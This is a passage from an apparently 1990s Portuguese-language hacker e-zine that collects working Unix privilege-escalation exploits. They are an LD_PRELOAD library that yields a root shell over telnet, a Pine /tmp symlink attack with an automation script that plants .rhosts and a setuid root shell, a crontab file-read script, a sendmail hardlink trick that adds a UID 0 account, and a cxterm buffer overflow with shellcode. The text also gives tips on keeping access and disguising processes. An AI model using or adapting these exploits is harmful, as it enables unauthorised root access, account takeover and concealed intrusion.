+localiza uma biblioteca para exploit, onde cairemos num shell ROOT.
+
+c) A brincadeira por ela mesma
+
+Requisitos para exploit:
+
+1. Acesso FTP ou Shell na makina 'vitima' com permissao para WRITE em
+algum diretorio. Podendo tbem escrever em algum diretorio a partir de
+alguma falha de um sistema NFS implementado no sistema (acreditem, elas
+existem).
+
+2. Se o acesso for via SHELL, sem problemas, se for via FTP com usuario
+com acesso WRITE ao seu diretorio, tbem sem problemas (pode tbem colocar
+no /tmp), mas se for via Anonymous FTP, deve haver permissao para escrever
+(write) em algum diretorio dos permitidos no mesmo.
+
+Compromissos do Exploit (em sistemas VULNERAVEIS):
+
+1. Shell ROOT por 60 segundos, devendo o invasor ter alguma coisa no
+buffer, para criar um usuario com UID 0 (ackkk, nao faca isso!!), ou mesmo
+um shell com setuid root (hmmm, melhor fazer isso)... Depende de sua
+criatividade, pois pode-se assegurar o futuro acesso a uma makina de
+diversas maneiras, e nao estou aki pra lhe ensinar o basico, porra. ;))
+
+Atencao, aki embaixo vao agora 3 arquivos, sendo eles, o Makefile, o
+getpass.c, e o openlog.c, respectivamente. Utilize o Makefile para criar a
+biblioteca 'libroot.so', com o comando 'make all', depois disso defina a
+variavel de sistema LD_PRELOAD como o caminho completo ateh a libroot.so,
+entao exporte-a, e abra conexao a makina-vitima, de tal maneira:
+
+telnet> open vitima.com
+
+-- Os Arquivos --
+
+-----------------------------CoRtE-AkI-D00d-------------------------------
+#Makefile
+#
+#                    Makefile para criar a libroot.so
+#
+#Esta Makefile produz uma libroot.so alterada, sendo esta que lhe darah um
+#shell root atravez de novas conexoes telnet
+#
+#Escrito por squidge - The Guild, e adaptado, traduzido e comentado por
+#Zaph0d - The Wild, hehe ;)
+#
+
+nothing:
+        @ echo "Para criar a biblioteca, digite 'make all'"
+        @ echo "Apos isso, digite 'make clean' e continue..."
+        @ echo " "
+        @ echo "squidge@onyx.infonexus.com"
+
+all: source lib install
+
+source: getpass openlog
+
+getpass: getpass.c
+        gcc -o getpass.o -c getpass.c -fPIC
+
+openlog: openlog.c
+        gcc -o openlog.o -c openlog.c -fPIC
+
+lib: getpass.o openlog.o
+        ld -shared -o libroot.so getpass.o openlog.o
+
+install: libroot.so
+        chmod 755 ./libroot.so
+clean:
+        @ rm -f *.o
+-----------------------------CoRtE-AkI-D00d-------------------------------
+/*                                                                      */
+/* Substituto para a libc getpass() que lhe dah um shell ROOT           */
+/*                                                squidge@infonexus.com */
+
+#include <stdio.h>
+
+char *getpass(const char *prompt)
+{
+        printf("Bem-vindo(a) ao maravilhoso mundo do uid = 0\n");
+        printf("                                  squidge\n\n");
+        fflush(stdout);
+        system("/bin/sh");
+        printf("exploit from my forthcoming paper:\n");
+        printf("Hardening your site - outside -> in\n");
+        printf("Com a colaboracao da zine RWX");
+}
+-----------------------------CoRtE-AkI-D00d-------------------------------
+/*                                                                      */
+/* Substituto para a libc openlog() que lhe dah um shell ROOT           */
+/*                                                squidge@infonexus.com */
+
+#include <stdio.h>
+
+void openlog(char *t1, int t2, int t3)
+{
+        printf("Bem-vindo(a) ao maravilhoso mundo do uid = 0\n");
+        printf("                                  squidge\n\n");
+        fflush(stdout);
+        system("/bin/sh");
+        printf("exploit from my forthcoming paper:\n");
+        printf("Hardening your site - outside -> in\n");
+        printf("Com a colaboracao da zine RWX");
+}
+-----------------------------CoRtE-AkI-D00d--------------------------------
+
+d) Invadindo...
+
+Apos colocar esses 3 arquivos (Makefile, getpass.c, openlog.c) num certo
+diretorio, deve-se digitar: 'make all', e depois (se desejar) 'make
+clean', para detonar os arquivos .o q nao sao mais uteis. Haverah entao um
+NOVO arquivo criado, o 'libroot.so', e eh esta coisinha pequenina que te
+ajudarah a ganhar o shell ROOT. Como explicado acima, vc deve proceder da
+seguinte maneira:
+
+1) Atraves de acesso Shell, ou FTP com permissao Write, ou mesmo alguma
+falha de um sistema NFS implementado, fazer o UPLOAD do arquivo
+'libroot.so' para algum diretorio, e entao saber EXATAMENTE o caminho
+completo onde estah o libroot.so (eg. /diretorio/libroot.so). O caminho
+completo pode ser descoberto no Shell ou FTP digitando-se o comando 'pwd'.
+
+Veja o ex. completo abaixo:
+
+rwx:~/hack$ ls
+Makefile          getpass.c         openlog.c
+rwx:~/hack$ make all
+gcc -o getpass.o -c getpass.c -fPIC
+gcc -o openlog.o -c openlog.c -fPIC
+ld -shared -o libroot.so getpass.o openlog.o
+chmod 755 ./libroot.so
+rwx:~/hack$ make clean
+rwx:~/hack$ ftp
+ftp> open vitima.com
+...
+ftp> bin
+ftp> put libroot.so
+ftp> pwd
+/home/rwx
+ftp> quit
+
+Aki agora vc jah colocou o arquivo 'libroot.so' no diretorio /home/rwx,
+entao vc volta akela explicacao de definir/exportar variaveis, e comeca a
+invadir efetivamente o sistema:
+
+rwx:~/hack$ telnet
+telnet> environ define LD_PRELOAD /home/rwx/libroot.so
+telnet> environ export LD_PRELOAD
+telnet> open vitima.com
+
+Apos isso deve-se estabelecer uma conexao TELNET normal, ateh o ponto que
+vc cai num SHELL root, e recebe a mensagem:
+
+Bem-vindo(a) ao maravilhoso mundo do uid = 0
+                                  squidge
+
+Faca entao o seguinte:
+
+bash# whoami
+root
+bash#
+
+Lembre-se, esse Shell ROOT soh dura 60 segundos (podendo variar alguns
+segundos dependendo do clock do sistema), entao vc deve jah ter em mente,
+ou no buffer (pra mim tanto faz, minha mente eh um um buffer, hehe), algum
+modo de assegurar seu futuro acesso a esta makina 'vitima', como por ex.
+criar um usuario com UID = 0 no /etc/passwd (isso eh loucura, nao faca
+isso, a menos q queira ser descoberto), ou algo mais 'smart' como copiar
+pro seu diretorio um shell (/bin/sh) com setuid root... Mas aih eh com vc,
+e jah dah pra se virar mto bem... And that the power goes with ya!!!
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+Exploits:
+=========
+
+ PINEBUG.
+ ========
+ By SkyNET  20/07/97
+
+Hi d00dz,
+Nesta primeira materia de exploits,resolvi escrever sobre o PineBug.O bug
+e muito simples de ser entendido,a nao ser que voce nao saiba nem o basico
+do Unix! Nesse caso eu te aconselho a nao perder tempo aqui. :-)
+
+COMO EXPLORAR O BUG.
+====================
+
+Pra comeco de conversa:
+
+1 -Voce tem que ter conta no sistema para fazer isso,nao obrigatoriamente
+   uma SHELL, mas tem que ter uma conta pra pelo menos executar o script.
+   Se o Admin restringiu seu acesso,colocando algum menuzinho idiota,
+   como no caso da Elogica, voce pode executar o Script pelo ~/.foward.
+   Nesse caso procure no /etc/passwd um usuario que tenha acesso ao shell,
+   sera a vitima ideal :-) hehe...
+
+2 -Observe qual usuario no sistema usa o Pine. Como saber isso? BAh...
+   veja se existe algum arquivo .pinerc no diretorio HOME dele.
+3 -Certifique-se de que a versao do Pine usada no sistema e anterior a
+   3.95 e se existe mensagem no spool da vitima.
+4 -Nao seja tao imbecil ao ponto de deixar o script rolando em background
+   com um nome "suspeito", aconselho a voce renomea-lo pra um nome de um
+   programa ja conhecido,ja que o Unix distingue os caracteres minusculos
+   e maiusculos.
+
+CONSEQUENCIAS:
+=============
+Dribla a permicao -w dos diretorios permitindo que qualquer usuario crie
+ou altere um arquivo no diretorio do outro.
+
+EXPLICANDO O BUG.
+================
+Primeiramente, quando um usuario executa o Pine, este cria um arquivo "chave"
+no diretorio /tmp. Este arquivo tem um nome estranho,tipo ".341.9103" cada
+usuario tera o seu proprio numero!  Obs:Se nao houver mensagem no spool o
+pine nao criara o arquivo!!
+Em posse desse numero, ja temos meio caminho andado. O que faremos sera
+simplesmente colocar o proprio arquivo CHAVE com um link simbolico para o
+arquivo desejado, ou seja quando ele entrar novamente no PINE, este ira criar
+a chave com permicao write p/ ALL e ao mesmo tempo o arquivo a ela ligado!
+hehehe facil, han? ;-)
+
+Vejamos o melhor o problema. Vamos supor que Eu(skynet) queira entrar na
+conta de "victim" sem usar senha! Isso e possivel? Pra muitos lamerz
+que frenquenta o #hackers tenho certeza que nao.
+Mas o que vamos fazer?!Colocar um .rhosts no HOME dele!
+
+HACKEANDO
+=========
+
+cyberdyne:/tmp$ ls -al
+total 3
+drwxrwxrwt   5 root     root         2048 Jul 20 06:02 .
+drwxr-xr-x  18 root     root         1024 Jul 20 01:00 ..
+-rw-rw-rw-   1 victim   users           3 Jul 20 06:02 .341.9103
+cyberdine:/tmp$
+
+K00l! Repare o arquivo .341.9103, isso significa que o user victim ta
+executando o pine, nele esta contido o seu PID, e o que vai nos interessar
+de imediato sera APENAS o nome desse arquivo! Ao sair do Pine o arquivo
+sera apagado imediatamente. E a hora de agir!
+
+cyberdine:/tmp$ ln -s ~victim/.rhosts .341.9103
+
+Obs: Se tentar fazer isso em versoes acima de 3.95, o pine reconhecera
+     o link ja existente no diretorio, avisara  o  cara  que  existe,
+     tornando a mensagem Read Only, e vc sera desmascarado!. TENHA CUIDADO!
+
+hehehe..agora e so esperar ele entrar novamente e o arquivo sera criado.
+Mas como saber se ele ja entrou? E facil.
+
+cyberdine:/tmp$ ls -al
+total 3
+drwxrwxrwt   5 root     root         2048 Jul 20 06:08 .
+drwxr-xr-x  18 root     root         1024 Jul 20 01:00 ..
+lrwxrwxrwx   1 skynet   users          20 Jul 20 06:08 .341.9103 ->
+/home/victim/.rhosts
+cyberdine:/tmp$ more .341.9103
+206
+cyberdine:/tmp$
+
+Repare bem esse numero(206), isso significa que victim executou o pine e
+criou a chave junto com o arquivo(rw)!!
+
+cyberdine:/tmp$ echo "localhost skynet" >~victim/.rhosts
+cyberdine:/tmp$ whoami
+skynet
+cyberdine:/tmp$ rlogin -l victim localhost
+Welcome to Linux 2.0.0
+cyberdine:~$ whoami
+victim
+cyberdine:~$
+
+E o ROOT ?!?! Como eu pego??
+Existem VARIAS saidas,uma delas e forca-lo a copiar um shell com setuid root.
+
+Ex:
+cyberdine:~$ echo "cp /bin/sh ~/.hack.sh" >~root/.bash_profile
+cyberdine:~$ echo "chmod 4777 ~/.hack.sh" >>~root/.bash_profile
+
+K00l! Agora e so esperar ele entrar no sistema e...
+
+cyberdine:~$ ~root/.hack.sh
+cyberdine:~# whoami
+root
+cyberdine:~#
+
+NOTA:
+====
+Evidentemente voce vai perder muito tempo esperando que o cara execute o
+pine 2x, se e que ele vai executar! Portanto aconselho a usar script
+abaixo! Embora correndo serios riscos de ser pego (isso dependera de sua
+malicia) ele poupara todo esse trabalho!
+
+USANDO O SCRIPT
+================
+Nao ha o que explicar aqui, se vc nao entendeu o que foi explicado acima
+certamente nao entendera o script e nao merece usa-lo.  Compre  um  bom
+livro de Unix ou  comece  a  ler textos pela Internet. :-)
+
+No exemplo abaixo alterei o nome do script pra o nome de um
+editor bastante conhecido, a unica diferenca ta na inicial maiuscula.
+Uma maneira de evitar chamar atencao quando alguem pedir a listagem dos
+processos na maquina.
+
+cyberdine:~$ mv pinebug.sh Joe
+cyberdine:~$ Joe victim ~victim/.rhosts >~/.#.log &
+[1] 293
+cyberdine:~$
+
+Obs: O direcionamento pra um arquivo log e apenas opcional, para mante-lo
+     informado da situacao.Aconselho a tirar todas as permicoes not-user
+     desse arquivo, evitando que algum xereta metido a merda possa ler.
+
+Agora va dormir e depois acorde pra ver o log ;-)
+Espero que tenham gostado e lembrem-se:
+"Nao seja um lamer e saia por ai contando as coisas pra qualquer
+um, compartilhe-as com alguem de sua confianca"
+
+Cya, dude.
+
+//------------------------------CORTE AQUI -------------------------------//
+#!/bin/sh
+argumentos=0
+if [ $# -eq $argumentos ]
+  then
+    echo "Use: $0 username path/file_to_create & "
+    exit
+fi
+username=$1
+
+file=$2
+
+#MODIFIQUE AQUI:
+text='blablablabla'
+usr=/usr/bin/users
+pineprog=pine
+#
+date
+echo "- Verificando se  $1 fez o login "
+echo "- Aguarde..."
+#
+entrada=0
+entro=0
+
+until [ $entro -ne $entrada ]
+do
+        for nome in `$usr`
+        do
+         if [ $nome = $1 ]
+            then
+                entro=1
+
+         fi
+        done
+
+done
+date
+echo "- Ok, $username ja entrou no sistema."
+
+echo "- Agora vamos esperar que $1 execute o Pine e leia a mensagem. "
+
+noexecuto=0
+executo=0
+
+until [ $executo -ne $noexecuto ]
+do
+
+     for executando in `w $username`
+     do
+       if [ $executando = $pineprog ]
+         then
+                date
+                echo '- OK ' $1 ' esta executando o  ' $pineprog '.'
+                executo=1
+
+       fi
+     done
+
+done
+
+echo "- Agora vamos pegar o arquivo lock de $username no diretorio /tmp"
+
+#Colocamos o conteudo do arquivo lock gerado durante a leitura da mensagem
+#direcionando para temp1 e temp2
+ls -al /tmp | grep $username > temp1
+cat temp1 | grep rw-rw-rw- > temp2
+
+#Captura a chave e atribui seu nome a variavel $lockfile
+lockfile=`awk '{print $9}' temp2`
+echo " Apagando os arquivos temporarios... "
+rm temp1
+rm temp2
+echo "> Username $username"
+echo "> Lockfile $lockfile"
+echo
+echo "- OK, vamos esperar que  $username "
+echo "  saia do $pineprog "
+cd /tmp
+
+while [ -s $lockfile ]
+    do
+    sleep 0
+done
+
+cd
+date
+echo "- OK $username saiu do $pineprog .. para linkar $lockfile "
+
+cd /tmp
+#linkando a chave com o arquivo escolhido
+ln -s $file $lockfile
+echo "- $lockfile esta linkado "
+cd
+echo "- $username Agora espere que $username retorne ao pine para criar"
+echo " $file "
+echo "- Aguardando $username retornar ao Pine...  "
+
+noexecuto=0
+executo=0
+
+until [ $executo -ne $noexecuto ]
+do
+     for executando in `w $username `
+     do
+       if [ $executando = $pineprog ]
+         then
+                date
+                echo '- OK ' $username ' esta rodando o  ' $pineprog
+                executo=1
+
+       fi
+     done
+
+done
+echo "- Inserindo o texto..."
+cd /tmp
+echo $text > $lockfile
+echo "- Deletando $lockfile ... "
+rm $lockfile
+cd
+echo "hehehe.. veja o $file no diretorio dele! ;-)"
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+CRONTAB
+=======
+auth 97
+
+Esse e' um exploit nao muito conhecido pela galera, por isso,aproveitando
+espaco,e informacao,colocarei esse problema que curte testar seus ultimos
+bugs da hora , esse e' meio antigo mais atinge sistemas bem protegidos, e
+feitos "para aguentar tudo".
+
+Originalmente feito por kmem, alterado e remanejado por auth.
+
+sistemas atingidos: OSF/1, AIX 3.2.5, Digital UNIX (wow!)
+uso: nome <arquivo q vc quer> <destino>
+
+#!/bin/sh
+
+if [ $# -ne '2' ]; then
+ echo "usage: $0 <arquivo q vc quer> <destino>"
+ exit
+fi
+
+bla=$1
+ble=$2
+export bla
+
+UNAME=`uname`
+GIRLIES="1.awk aix.sed myedit.sh myedit.c .rwx-tmp1"
+
+#SETUP the awk script
+cat >1.awk <<END
+{
+new= i%2
+if (new == 0) print \$0
+i++
+}
+END
+
+cat >aix.sed <<END
+/^crontab:/d
+/^$/d
+END
+
+#shell script
+cat >myedit.sh <<EDITOR_END
+#!/bin/ksh
+
+rm \$1
+ln -s \$bla \$1
+exit
+EDITOR_END
+
+chmod 700 myedit.sh
+
+#save old vars
+oldedit=$EDITOR
+oldvis=$VISUAL
+VISUAL=./myedit.sh
+EDITOR=./myedit.sh
+export EDITOR
+export VISUAL
+
+#do the exploit@!&*&*(!@*(&
+
+if [ $UNAME = "AIX" ]; then
+ crontab -e 2>.rwx-tmp1
+ sed -f aix.sed .rwx-tmp1 > $ble
+elif [ $UNAME =  "OSF1" ]; then
+ #FOR DIGITAL UNIX 3.X or higher machines uncomment these 2 lines
+ crontab -e 2>.rwx-tmp1
+ awk -f 1.awk .rwx-tmp1 >$ble
+ # FOR PRE DIGITAL UNIX 3.X machines uncomment this line
+ #crontab -l 2>&1 > $ble
+else
+ echo "Sem essa cara, cade o SO ? acho q voce nao leu direito"
+ echo "fuck,fuck,fuck"
+ exit
+fi
+
+echo "wow ! $ble"
+echo "lookit!"
+echo "rwx"
+
+#cleanup our mess
+crontab -r
+VISUAL=$oldvis
+EDITOR=$oldedit
+bla=''
+ble=''
+export bla
+export ble
+export VISUAL
+export EDITOR
+rm -f $GIRLIES
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+SENDMAIL 8.8.4
+==============
+auth 97
+
+Vamo detona com a ajuda do hardlink! :)
+Esse problema e' vc ativar um  hardlink entre o passwd com o dead.letter,
+O sendmail e' rodado pelo root, ou seja , oque voce executar por ele,voce
+conseguira ele como  root . Ou seja , ai vai um exemplo de como exploitar
+isso, e ainda de quebra, pegar root no provedor. :)
+
+Voce tem que ter shell la!!
+Testado e aprovado por auth em algum server do Brasil com sendmail 8.8.4.
+
+rwx$: ln /etc/passwd /var/tmp/dead.letter
+rwx$: exit
+
+depois, basta telnetiar para o sendmail do provedor (25).
+
+mail from: root@rwx.org "nao eh necessario ser real"
+Sender OK
+rcpt to: root@rwx.org "nao eh necessario ser real"
+Recepient OK
+data
+rwx::0:0:chmod rocks:/:/bin/bash
+.
+Message Accepted
+quit
+
+pronto, ele ira criar o usuario rwx como superuser. simples e eficaz. :)
+
+SOLUCAO ....
+
+Bom, nao consegui achar uma solucao 'plausivel' para esta ocasiao,ou seja
+como sairam novas versoes de sendmail, so' troque por versoes mais novas.
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+CXTERM
+======
+n3trunn3r
+
+Esse exploit funciona nas ultimas versoes do linux Slackware , e  consegue
+obter  acesso  root atraves de uma  falha no arquivo /usr/X11R6/bin/cxterm
+que se estiver com o atributo +s(suid) vai funcionar...
+
+       ----------------------------//----------------------------------
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+#define CXTERM_PATH "/usr/X11R6/bin/cxterm"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+#define NOP_SIZE 1
+char nop[] = "\x90";
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc,char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i,OffSet = DEFAULT_OFFSET;
+
+   if (argc>1) OffSet = atoi(argv[1]);
+
+   buff = malloc(2048);
+   if(!buff)
+   {
+      printf("Buy more RAM!\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE;
+i+=NOP_SIZE) {
+        memcpy (ptr,nop,NOP_SIZE);
+        ptr+=NOP_SIZE;
+   }
+
+   for(i=0;i < strlen(shellcode);i++)
+      *(ptr++) = shellcode[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_sp() + OffSet;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   (void) fprintf(stderr,
+         "This bug is discovered by Ming Zhang
+(mzhang@softcom.net)\n");
+    execl(CXTERM_PATH, "cxterm", "-xrm",buff, NULL);
+}
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+E-MAILS
+=======
+
+Bom, essa e' a primeira edicao, por isso nao temos email algum... hehe
+Espero que isso mude. :))
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+END
+===
+
+Se Deus nos ajudar, e se recebermos muitos emails ai, vai ter proxima
+edicao, hehehe...
+
+Proxima edicao, vamos publicar algo de NT, de sun, e ate de MAC... :))
+falo...
+
+auth
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+-END-
